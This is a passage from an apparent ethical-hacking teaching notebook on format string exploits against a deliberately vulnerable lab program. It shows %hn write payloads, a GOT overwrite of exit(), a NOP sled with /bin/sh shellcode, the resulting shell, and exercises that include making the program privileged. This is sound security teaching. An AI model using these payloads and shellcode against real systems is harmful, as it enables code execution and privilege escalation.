                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ffffbf50                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         0\r\n",
      "\r\n",
      "[*] test_val @ 0x0804c028 = -8283 0xffffdfa5\r\n",
      "[*] text is @ 0xffffbf50\r\n"
     ]
    }
   ],
   "source": [
    "# let's write 0xffff using hn to two most siginificat byte at ...2e and 2f\n",
    "! ./fmt_vuln.exe $(printf \"\\x28\\xc0\\x04\\x08\\x2a\\xc0\\x04\\x08\")%57245x%4\\$hn%8282x%5\\$hn"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 131,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0804c018 R_386_JUMP_SLOT   exit@GLIBC_2.0\r\n"
     ]
    }
   ],
   "source": [
    "# find the exit function's address in GOT and write SHELLCODE address to it\n",
    "! objdump -R ./fmt_vuln.exe | grep exit"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 134,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0x1a\n"
     ]
    }
   ],
   "source": [
    "# find the offset 2nd two bytes\n",
    "print(hex(0x18+2))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 135,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "\u0018�\u0004\b\u001a�\u0004\b%57245x%4$hn%8282x%5$hn\r\n",
      "\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "\u0018�\u0004\b\u001a�\u0004\b                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ffffbf50                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         0\r\n",
      "\r\n",
      "[*] test_val @ 0x0804c028 = -72 0xffffffb8\r\n",
      "[*] text is @ 0xffffbf50\r\n"
     ]
    }
   ],
   "source": [
    "# Simply replace test_val's address with exit() address in the same order\n",
    "! ./fmt_vuln.exe $(printf \"\\x18\\xc0\\x04\\x08\\x1a\\xc0\\x04\\x08\")%57245x%4\\$hn%8282x%5\\$hn"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### run the above command on terminal\n",
    "- you'll see a terminal you can interact with\n",
    "\n",
    "```bash\n",
    "...\n",
    "        0\n",
    "\n",
    "[*] test_val @ 0x0804c028 = -72 0xffffffb8\n",
    "[*] text is @ 0xffffbfa0\n",
    "$ whoami\n",
    "kali\n",
    "$ date\n",
    "Tue Dec 22 22:29:15 MST 2020\n",
    "$ exit\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Smuggle exploit code into the text buffer\n",
    "- instead of stashing the Shellcode in environment variable, send it to the program and make the program execute it by overwriting the exit() function in GOT\n",
    "### Steps\n",
    "1. create a string in this format: `| NOP Sled | Exploit Code |`\n",
    "2. find the address of `exit( )`\n",
    "3. overwrite the address of exit with the address of text buffer\n",
    "    - exploit printf vulnerability to overwrite the address with your controlled address where the explot code resides"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 136,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "24 ./shellcode.bin\r\n"
     ]
    }
   ],
   "source": [
    "# find the size of exploit code\n",
    "! wc -c ./shellcode.bin\n",
    "# shellcode is 24 bytes"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 155,
   "metadata": {},
   "outputs": [],
   "source": [
    "# create a string that's multiple of 4\n",
    "# text buffer is 1024 bytes big\n",
    "! python -c 'import sys; sys.stdout.buffer.write(b\"\\x90\"*12)' > exploit_fmt.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 156,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "12 ./exploit_fmt.bin\r\n"
     ]
    }
   ],
   "source": [
    "! wc -c ./exploit_fmt.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 157,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "00000000  90 90 90 90 90 90 90 90  90 90 90 90              |............|\r\n",
      "0000000c\r\n"
     ]
    }
   ],
   "source": [
    "! hexdump -C exploit_fmt.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 158,
   "metadata": {},
   "outputs": [],
   "source": [
    "# let'S append Shellcode to the exploit code after the NOP sled\n",
    "! cat shellcode.bin >> exploit_fmt.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 159,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "36 exploit_fmt.bin\r\n"
     ]
    }
   ],
   "source": [
    "! wc -c exploit_fmt.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 160,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "00000000  90 90 90 90 90 90 90 90  90 90 90 90 31 c0 50 68  |............1.Ph|\r\n",
      "00000010  2f 2f 73 68 68 2f 62 69  6e 89 e3 31 c9 89 ca 6a  |//shh/bin..1...j|\r\n",
      "00000020  0b 58 cd 80                                       |.X..|\r\n",
      "00000024\r\n"
     ]
    }
   ],
   "source": [
    "! hexdump -C exploit_fmt.bin"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### find the address of text buffer using gdb\n",
    "- can't easily find the actual address of text buffer\n",
    "- it shifts as we run the program with some arguments (size of the arguments matter), environment variables, program name, etc.\n",
    "- gdb also sets its own environment variables such as LINES, COLUMNS, etc.\n",
    "<img src=\"media/gdb-env.png\">\n",
    "- detail: https://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it/17775966#17775966\n",
    "\n",
    "```bash\n",
    "$ gdb -q ./fmt_vuln.exe\n",
    "$ break main\n",
    "$ run \"try with as much string as close to actual exploit code that will be sent to the program\"\n",
    "$ p/x &text\n",
    "```\n",
    "\n",
    "\n",
    "```bash\n",
    "$ run $(perl -e 'print \"A\"x4')\n",
    "$ p/x &text\n",
    "output: $1 = 0xffffcc70\n",
    "\n",
    "$ run $(perl -e 'print \"A\"x181')\n",
    "$ p/x &text\n",
    "output: $1 = 0xffffcbc0\n",
    "```\n",
    "\n",
    "- we get different value outside the gdb\n",
    "- there are workaround but a little tidious...\n",
    "- for shake of learning and easiness, the address of text is printed!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 145,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n",
      "\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n",
      "\r\n",
      "[*] test_val @ 0x0804c028 = -72 0xffffffb8\r\n",
      "[*] text is @ 0xffffbf40\r\n"
     ]
    }
   ],
   "source": [
    "! ./fmt_vuln.exe $(python -c 'print(\"A\"*50)')\n",
    "# notebook gives different address than than the terminal; try it!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 146,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n",
      "\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n",
      "\r\n",
      "[*] test_val @ 0x0804c028 = -72 0xffffffb8\r\n",
      "[*] text is @ 0xffffbeb0\r\n"
     ]
    }
   ],
   "source": [
    "! ./fmt_vuln.exe $(python -c 'print(\"A\"*200)')\n",
    "# text is at different address as the argument is longer"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Do this directly on Terminal\n",
    "- as address of text buffer changes depending on where and how the program is run (with what argument)\n",
    "\n",
    "- find the right parameter number that starts repeating the AAAA in hex (41414141)\n",
    "     - try 1 2 ... n\n",
    "\n",
    "- after trial and error 13'th argument prints 41414141 (AAAA) again\n",
    "- we already know parameter #4 is where AAAA repeats again; it should be more than 4\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/EthicalHacking]\n",
    "└─$ ./fmt_vuln.exe $(cat exploit_fmt.bin)$(printf \"AAAABBBB\")%13\\$x\n",
    "The right way to print user-controlled input:\n",
    "������������1�Ph//shh/bin��1ɉ�j\n",
    "                               XAAAABBBB%13$x\n",
    "\n",
    "The wrong way to print user-controlled input:\n",
    "������������1�Ph//shh/bin��1ɉ�j\n",
    "                               XAAAABBBB41414141\n",
    "\n",
    "[*] test_val @ 0x0804c028 = -72 0xffffffb8\n",
    "[*] text is @ 0xffffbf90\n",
    "\n",
    "```\n",
    "\n",
    "- let's use test_val's address to write data\n",
    "- now notice the address of text\n",
    "- we need to print shellcode code with nop sled of size 36 (see above)\n",
    "- we're need to write 2 4-byte addresses (8 bytes) to access and print to that location\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/EthicalHacking]\n",
    "└─$ printf \"%d\" $((0xbf90-36-8))\n",
    "48996  \n",
    "\n",
    "┌──(kali㉿K)-[~/EthicalHacking]\n",
    "└─$ printf \"%d\" $((0xffff - 0xbf90))\n",
    "16495 \n",
    "```\n",
    "\n",
    "- let's check if we calculated the text buffer's address by writing it to test_val first\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/EthicalHacking]\n",
    "└─$ ./fmt_vuln.exe $(cat exploit_fmt.bin)$(printf \"\\x28\\xc0\\x04\\x08\\x2a\\xc0\\x04\\x08\")%48996x%13\\$hn%164945x%14\\$hn\n",
    "\n",
    "...\n",
    "\n",
    "[*] test_val @ 0x0804c028 = -16496 0xffffbf90 <----- that was the address we wanted to write!!!!\n",
    "[*] text is @ 0xffffbf80 <---- address has changed however....!!!!!\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Adjust the width...\n",
    "- recreate the exploit and launch with the new values (text buffer's address has changed...)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 176,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "48980\n"
     ]
    }
   ],
   "source": [
    "print(0xbf80-36-8)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 175,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "16511"
     ]
    }
   ],
   "source": [
    "! printf \"%d\" $((0xffff-0xbf80))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 170,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0804c018 R_386_JUMP_SLOT   exit@GLIBC_2.0\r\n"
     ]
    }
   ],
   "source": [
    "# find the address of exit in GOT to write to\n",
    "! objdump -R ./fmt_vuln.exe | grep exit"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- we've our our exploit code\n",
    "```bash\n",
    "./fmt_vuln.exe $(cat exploit_fmt.bin)$(printf \"\\x18\\xc0\\x04\\x08\\x1a\\xc0\\x04\\x08\")%48980x%13\\$hn%16511x%14\\$hn\n",
    "```\n",
    "- run the final exploit code on Terminal\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/EthicalHacking]\n",
    "└─$ ./fmt_vuln.exe $(cat exploit_fmt.bin)$(printf \"\\x18\\xc0\\x04\\x08\\x1a\\xc0\\x04\\x08\")%48980x%13\\$hn%16511x%14\\$hn\n",
    "The right way to print user-controlled input:\n",
    "������������1�Ph//shh/bin��1ɉ�j\n",
    "                               X▒▒%48980x%13$hn%16511x%14$hn\n",
    "\n",
    "The wrong way to print user-controlled input:\n",
    "������������1�Ph//shh/bin��1ɉ�j\n",
    "                               X▒▒         \n",
    "                              ...\n",
    "[*] test_val @ 0x0804c028 = -72 0xffffffb8\n",
    "[*] text is @ 0xffffbf80\n",
    "$ whoami\n",
    "kali\n",
    "$ date\n",
    "Tue Dec 22 23:32:18 MST 2020\n",
    "$ exit\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Exercise 1\n",
    "- stash your shellcode in shell environment and and exploit the `format string` vulnerability in fmt_vuln2.cpp to execute the shellcode by modifying the return address to the address of shellcode in environment variable.\n",
    "\n",
    "### steps:\n",
    "- stash your shellcode in shell environment\n",
    "- find the address of shellcode using getenvaddr program\n",
    "- find the nth parameter that'll crash fmt_vuln2.exe program\n",
    "\n",
    "```bash\n",
    "$ python -c 'print(\"AAAA%x%x%x%x%x%x%x\")' | ./fmt_vuln2.exe \n",
    "$ python -c 'print(\"AAAA%x%x%x%x%x%x%7\\$x\")' | ./fmt_vuln2.exe\n",
    "$ python -c 'print(\"<return address>%7\\$n\")' | ./fmt_vuln2.exe\n",
    "$ python -c 'print(\"<8-byte return address>%widthx%7\\$hn%widthx%8\\$hn\")' | ./fmt_vuln2.exe\n",
    "```\n",
    "- doing some math, update the return address using half-write with shellcode address"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Exercise 2\n",
    "- Smuggle your `shellcode` as a part of data into the program and exploit the `format string` vulnerability in fmt_vuln2.c program found in this repo by modifying the return address to point to the exploit code.\n",
    "\n",
    "### steps\n",
    "- works on 32-bit and 64-bit Kali\n",
    "- compile and make fmt_vuln2.c program a privileged program\n",
    "- run the program to note the return address and the address of input buffer\n",
    "- create an exploit file with 12 (nop sled) + 24 (shellcode) = 36 bytes it makes it easier if the total bytes is multiple of 4\n",
    "```bash\n",
    "$ python -c 'import sys; sys.stdout.buffer.write(b\"\\x90\"*12)' > fmt_vuln2exploit.bin\n",
    "$ cat shellcode.bin >> fmt_vuln2exploit.bin\n",
    "$ wc -c fmt_vuln2exploit.txt\n",
    "```\n",
    "- find out the right parameter number that starts repeating AAAA in hex\n",
    "```bash\n",
    "$ ./fmt_vuln2.exe $(cat fmt_vuln2exploit.txt)$(printf \"AAAA\")%1\\$x\n",
    "$ ./fmt_vuln2.exe $(cat fmt_vuln2exploit.txt)$(printf \"AAAA\")%2\\$x\n",
    "$ ./fmt_vuln2.exe $(cat fmt_vuln2exploit.txt)$(printf \"AAAA\")%15\\$x\n",
    "$ ./fmt_vuln2.exe $(cat fmt_vuln2exploit.txt)$(printf \"AAAA\")%15\\$x\n",
    "```\n",
    "\n",
    "- now find the width parameter to write the address of input buffer at the return address: let's say:\n",
    "    - input is @ 0xffffc2e8\n",
    "    - return address @ 0xffffc3bc\n",
    " \n",
    "- find the width for the least 2 significant bytes\n",
    "\n",
    "```bash\n",
    "$ printf \"%d\" $((0xc2e8-36-8)) # 36 bytes is exploit code; that is printed as well. => 49852\n",
    "$ printf \"%d\" $((0xffff-0xc2f8)) # -> 15639\n",
    "```\n",
    "- final exploit will look something like this...\n",
    "\n",
    "```bash\n",
    "$ ./fmt_vuln2.exe $(cat fmt_vuln2exploit.txt)$(printf \"\\xbc\\xc3\\xff\\xff\\xbe\\xc3\\xff\\xff\")%49852x%15\\$hn%15639x%16\\$hn\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
